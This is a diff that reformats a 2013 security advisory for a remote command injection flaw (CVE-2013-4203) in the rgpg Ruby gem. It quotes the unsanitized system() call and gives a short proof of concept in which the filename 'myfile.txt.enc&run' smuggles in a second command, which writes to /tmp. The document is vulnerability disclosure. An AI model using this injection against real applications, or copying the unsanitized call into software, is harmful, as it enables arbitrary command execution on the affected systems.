@@ -1,43 +1,50 @@
-                                Advisory #: 95
-Title: Rgpg 0.2.2 Ruby Gem Remote Command Injection
-Author:Larry W. Cashdollar, @_larry0
-Date: 2013-07-31
-Download Site: https://rubygems.org/gems/rgpg
-Vendor:Richard Cook
-Vendor Notified: 2013-08-01
-Vendor Contact: rcook@rcook.org
-Description: A simple Ruby wrapper around gpg command for file encryption. rgpg
-is a simple API for interacting with the gpg tool. It is specifically designed
-to avoid altering global keyring state by creating temporary public and secret
-keyrings on the fly for encryption and decryption.
-Vulnerability:
-The following code snippet does not sanitize user supplied input before passing
-it to the System () function for execution. If this ApI is used in the context
-of a rails application remote commands can be injected into the shell. in lib/
-rgpg/gpg_helper.rb: 68 begin 69 outputfile.close 70 result = system("#
-{commandline} > #{output_file.path} 2>&1") 71 ensure
-CVE-2013-4203
-JSON:Export
-Exploit Code:
-   1. larry@sp0rk:~$ cat /bin/run
-   2. #!/bin/sh
-   3.  
-   4. echo "Command Injection" > /tmp/rci.txt
-   5.  
-   6. irb(main):027:0* Rgpg::GpgHelper.encrypt_file 'mykey.pub', 'myfile.txt',
-      'myfile.txt.enc&run'
-   7. => nil
-   8. irb(main):028:0> gpg: keyring `/tmp/gpg-key-ring20130804-2970-1et1k4c'
-      created
-   9. gpg: processing message failed: eof
-  10.  
-  11. After above completes:
-  12.  
-  13. larry@sp0rk:~$ ls -l /tmp/rci.txt
-  14. -rw-rw-r-- 1 larry larry 18 Aug  4 11:12 /tmp/rci.txt
-  15. larry@sp0rk:~$ cat /tmp/rci.txt
-  16. Command Injection
-  17. larry@sp0rk:~$
-  18.  
-Screen Shots:
-Advisory: http://www.vapid.dhs.org/advisories/rgpg-api-rubygem-cmd-inj.html
+
+                               Advisory #: 95
+
+   Title: Rgpg 0.2.2 Ruby Gem Remote Command Injection
+   Author: Larry W. Cashdollar, @_larry0
+   Date: 2013-07-31
+   Download Site: https://rubygems.org/gems/rgpg
+   Vendor: Richard Cook
+   Vendor Notified: 2013-08-01
+   Vendor Contact: rcook@rcook.org
+   Description: A simple Ruby wrapper around gpg command for file
+   encryption. rgpg is a simple API for interacting with the gpg tool. It
+   is specifically designed to avoid altering global keyring state by
+   creating temporary public and secret keyrings on the fly for encryption
+   and decryption.
+   Vulnerability:
+   The following code snippet does not sanitize user supplied input before
+   passing it to the System () function for execution. If this ApI is used
+   in the context of a rails application remote commands can be injected
+   into the shell. in lib/rgpg/gpg_helper.rb: 68 begin 69 outputfile.close
+   70 result = system("#{commandline} > #{output_file.path} 2>&1") 71
+   ensure
+   CVE-2013-4203
+   JSON: Export
+   Exploit Code:
+
+    1. larry@sp0rk:~$ cat /bin/run
+    2. #!/bin/sh
+    3.
+    4. echo "Command Injection" > /tmp/rci.txt
+    5.
+    6. irb(main):027:0* Rgpg::GpgHelper.encrypt_file 'mykey.pub',
+       'myfile.txt', 'myfile.txt.enc&run'
+    7. => nil
+    8. irb(main):028:0> gpg: keyring
+       `/tmp/gpg-key-ring20130804-2970-1et1k4c' created
+    9. gpg: processing message failed: eof
+   10.
+   11. After above completes:
+   12.
+   13. larry@sp0rk:~$ ls -l /tmp/rci.txt
+   14. -rw-rw-r-- 1 larry larry 18 Aug 4 11:12 /tmp/rci.txt
+   15. larry@sp0rk:~$ cat /tmp/rci.txt
+   16. Command Injection
+   17. larry@sp0rk:~$
+   18.
+
+   Screen Shots:
+   Advisory:
+   http://www.vapid.dhs.org/advisories/rgpg-api-rubygem-cmd-inj.html
